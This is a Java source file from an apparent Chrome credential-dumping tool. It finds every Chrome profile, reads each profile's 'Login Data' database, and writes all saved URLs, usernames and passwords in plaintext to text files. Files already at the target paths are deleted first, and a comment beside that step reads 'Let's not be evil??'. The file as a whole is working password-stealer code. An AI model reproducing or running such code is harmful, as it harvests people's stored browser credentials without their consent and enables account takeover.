package me.matt.chrome.acc.util;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import me.matt.chrome.acc.exception.ChromeNotFoundException;
import me.matt.chrome.acc.exception.DatabaseConnectionException;
import me.matt.chrome.acc.exception.DatabaseReadException;
import me.matt.chrome.acc.exception.UnsupportedOperatingSystemException;
import me.matt.chrome.acc.wrappers.ChromeAccount;
import me.matt.chrome.acc.wrappers.ChromeDatabase;
import me.matt.chrome.acc.wrappers.ChromeProfile;

public class Dumper {

    private Map<File, ChromeAccount[]> profiles;

    private Dumper(Map<File, ChromeAccount[]> profiles) {
        this.profiles = profiles;
    }

    public boolean saveToFile() throws IOException {
        for (File file : profiles.keySet()) {
            if (file.exists()) {
                file.delete(); // TODO: Let's not be evil??
            }
            file.getParentFile().mkdirs();
            file.createNewFile();
            ChromeAccount[] accounts = profiles.get(file);
            List<String> lines = new ArrayList<>();
            for (ChromeAccount account : accounts) {
                lines.add("URL: " + account.getURL());
                lines.add("Username: " + account.getUsername());
                lines.add("Password: " + account.getPassword());
                lines.add("");
            }
            lines.remove(lines.size() - 1);
            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
        }

        return true;

    }

    public String getDumpLocation() {
        return profiles.keySet().iterator().next().getParent();
    }

    public int getDumpSize() {
        return profiles.values().stream().mapToInt(b -> b.length).sum();
    }

    public int getAmountOfProfiles() {
        return profiles.keySet().size();
    }

    public static Dumper dumpAccounts() throws DatabaseConnectionException,
            DatabaseReadException, IOException,
            UnsupportedOperatingSystemException, InstantiationException {
        OperatingSystem os = OperatingSystem.getOperatingsystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new UnsupportedOperatingSystemException(
                    System.getProperty("os.name")
                            + " is not supported by this application!");
        }
        Path chromeInstall = Paths.get(os.getChromePath());

        File chromeInfo = new File(chromeInstall.toString(), "Local State");

        if (Files.notExists(chromeInstall)) {
            throw new ChromeNotFoundException(
                    "Google chrome intallation not found.");
        }

        ArrayList<ChromeProfile> profiles;;
        String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI()))
                .toArray(new String[] {});
        switch (OperatingSystem.getOperatingsystem()) {
            case WINDOWS:
                profiles = readProfiles(infoLines);
                break;
            case MAC:
                String line = infoLines[0];
                String lines[] = line.split("\\{|\\}");
                profiles = readProfiles(lines);
                break;
            default:
                throw new UnsupportedOperatingSystemException(
                        System.getProperty("os.name")
                                + " is not supported by this application!");

        }

        String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
        HashMap<File, ChromeAccount[]> accounts = new HashMap<File, ChromeAccount[]>();
        for (ChromeProfile profile : profiles) {
            File loginData = new File(chromeInstall.toString() + File.separator
                    + profile.getPath(), "Login Data");
            accounts.put(new File(pathToSave, "Accounts - " + profile.getName()
                    + ".txt"), readDatabase(loginData));
        }
        if (profiles.size() < 1) {
            throw new InstantiationException("No chrome profiles found!");
        }
        return new Dumper(accounts);
    }

    private static ArrayList<ChromeProfile> readProfiles(String[] infoLines) {
        ArrayList<ChromeProfile> profiles = new ArrayList<>();
        int id = 0;
        for (String line : infoLines) {
            line = line.trim();
            if (line.startsWith(",\"Profile ") || line.contains("\"Default\":")) {
                id++;
            }
            if (line.contains("\"name\":") && id > profiles.size()) {
                int nameIndex = line.indexOf("\"name\":")
                        + (OperatingSystem.getOperatingsystem() == OperatingSystem.WINDOWS ? 9
                                : 8);
                int lastIndex = line.indexOf("\"", nameIndex);
                profiles.add(new ChromeProfile(id - 1, line.substring(
                        nameIndex, lastIndex)));
            }
        }
        return profiles;
    }

    private static ChromeAccount[] readDatabase(File data)
            throws DatabaseConnectionException, DatabaseReadException,
            UnsupportedOperatingSystemException {
        ChromeDatabase db = ChromeDatabase.connect(data);
        ArrayList<ChromeAccount> accounts = db.selectAccounts();
        db.close();
        return accounts.toArray(new ChromeAccount[] {});
    }
}
